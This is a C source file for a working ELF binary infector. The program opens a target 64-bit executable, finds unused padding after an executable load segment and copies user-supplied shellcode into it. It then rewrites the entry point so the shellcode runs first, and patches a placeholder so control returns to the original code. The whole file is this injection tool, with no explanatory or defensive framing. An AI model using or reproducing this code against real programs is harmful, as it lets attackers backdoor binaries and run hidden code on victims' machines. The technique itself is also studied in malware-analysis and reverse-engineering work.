#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <elf.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define SHORTCALLSZ	5

static void* map_path(char* path, size_t* out_size);
static Elf64_Phdr* find_gap(Elf64_Ehdr* ehdr, size_t input_len);
static int poison_elf(Elf64_Ehdr* ehdr, Elf64_Phdr* gap_phdr, void* payload, size_t payload_len);

int main(int argc, char* argv[]) {
	void* target_data;
	void* payload_data;
	size_t target_len;
	size_t payload_len;
	Elf64_Phdr* gap_phdr;
	int err = EXIT_FAILURE;

	if (argc < 3) {
		printf("Usage: %s target_elf pic_shellcode\n", argv[0]);
		goto END;
	}

	target_data = map_path(argv[1], &target_len);
	if (target_data == NULL) {
		goto END;
	}

	payload_data = map_path(argv[2], &payload_len);
	if (payload_data == NULL) {
		goto UNMAP_TARGET_END;
	}

	printf("Target file size = 0x%x\n", target_len);
	
	/* find a suitable gap in the target */
	gap_phdr = find_gap((Elf64_Ehdr*)target_data, payload_len);
	if (gap_phdr == NULL) {
		fprintf(stderr, "Unable to find suitable gap!\n");
		goto UNMAP_END;
	}

	/* change the entry point, inject payload */
	if (poison_elf((Elf64_Ehdr*)target_data, gap_phdr, payload_data, payload_len) != 0) {
		goto UNMAP_END;
	}
	err = EXIT_SUCCESS;

UNMAP_END:
	munmap(payload_data, payload_len);
UNMAP_TARGET_END:
	munmap(target_data, target_len);
END:
	return err;
}

void* map_path(char* path, size_t* out_size) {
	int fd;
	struct stat st;
	void* data = NULL;
	
	fd = open(path, O_APPEND | O_RDWR);
	if (fd < 0) {
		perror("open");
		return NULL;
	}

	if (fstat(fd, &st) == -1) {
		perror("stat");
		close(fd);
		return NULL;
	}
	
	data = mmap(0, st.st_size,
		PROT_READ | PROT_WRITE, MAP_SHARED,
		fd,	0);
	close(fd);
	if (data == MAP_FAILED) {
		perror("mmap");
		return NULL;
	}

	*out_size = st.st_size;
	return data;
}

Elf64_Phdr* find_gap(Elf64_Ehdr* ehdr, size_t input_len) {
	Elf64_Phdr* phdr;
	int page_size;
	unsigned int i;
	Elf64_Addr content_end_addr;
	Elf64_Addr page_end_addr;
	uint64_t gap_len;
	uint64_t gap_offset = 0;

	page_size = getpagesize();

	/* iterate through the program headers to find executable sections of
	 * sufficient size */
	phdr = (Elf64_Phdr*)(((uint8_t*)ehdr) + ehdr->e_phoff);
	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_LOAD && (phdr->p_flags & PF_X)) {
			printf(
				"PHEADER: %c%c%c [%#016llx - %#016llx (%#llx)] [%#llx - %#llx (%#llx)]\n",
				(phdr->p_flags & PF_R) ? 'R' : '-',
				(phdr->p_flags & PF_W) ? 'W' : '-',
				(phdr->p_flags & PF_X) ? 'X' : '-',
				phdr->p_vaddr,
				phdr->p_vaddr + phdr->p_memsz,
				phdr->p_memsz,
				phdr->p_offset,
				phdr->p_offset + phdr->p_filesz,
				phdr->p_filesz
			);
			content_end_addr = phdr->p_vaddr + phdr->p_memsz;
			page_end_addr = (content_end_addr + (page_size -1)) & (~(page_size - 1));
			gap_len = page_end_addr - content_end_addr;
			printf("\tExecutable gap size 0x%llx\n", gap_len);
			if (gap_len >= input_len) {
				return phdr;
			}
		}
	}
	return NULL;
}

int poison_elf(Elf64_Ehdr* ehdr, Elf64_Phdr* gap_phdr, void* payload, size_t payload_len) {
	Elf64_Addr old_entry; /* regardless of ELF type, we want this to be an offset */
	Elf64_Addr old_entry_jmp_off;
	Elf64_Off gap_offset;
	uint64_t* jmp_addr;
	size_t placeholder = 0x4141414141414141;

	gap_offset = gap_phdr->p_offset + gap_phdr->p_memsz;
	if (ehdr->e_type == ET_DYN) {
		/* If DYN, entry is an offset from image base */
		old_entry = ehdr->e_entry;
		ehdr->e_entry = gap_offset;
		printf("Changed entry from %#llx to %#llx\n", old_entry, ehdr->e_entry);
	}
	else if (ehdr->e_type == ET_EXEC) {
		/* If EXEC, entry is a virtual address */
		old_entry = gap_phdr->p_offset + (ehdr->e_entry - gap_phdr->p_vaddr);
		ehdr->e_entry = gap_phdr->p_vaddr + gap_phdr->p_memsz;
		printf("Changed entry from %#016llx to %#016llx\n",
			 (old_entry - gap_phdr->p_offset) + gap_phdr->p_vaddr, ehdr->e_entry);
	}
	else {
		fprintf(stderr, "Unsupported ELF type\n");
		return 1;
	}

	/* inject the payload at gap offset */
	memcpy((uint8_t*)ehdr + gap_offset, payload, payload_len);
	printf("Payload injected\n");

	/* replace the key_value with old_entry */				 
	old_entry_jmp_off = (old_entry - gap_offset - SHORTCALLSZ);		 
					 /* (  0x10af0 - 0x73695    - 5) == -0x62BAA <- for 5-byte 'call short PONG' at the start of payload.S */
	
	jmp_addr = memmem((uint8_t*)ehdr + gap_offset, payload_len, &placeholder, sizeof(placeholder));
	if (jmp_addr == NULL) {
		fprintf(stderr, "No placeholder in payload for jump to original entry. Ignoring...\n");
		return 2;
	}
	*jmp_addr = old_entry_jmp_off;
	printf("Jump to original entry point inserted:  %p\n", &jmp_addr);

	return 0;
}
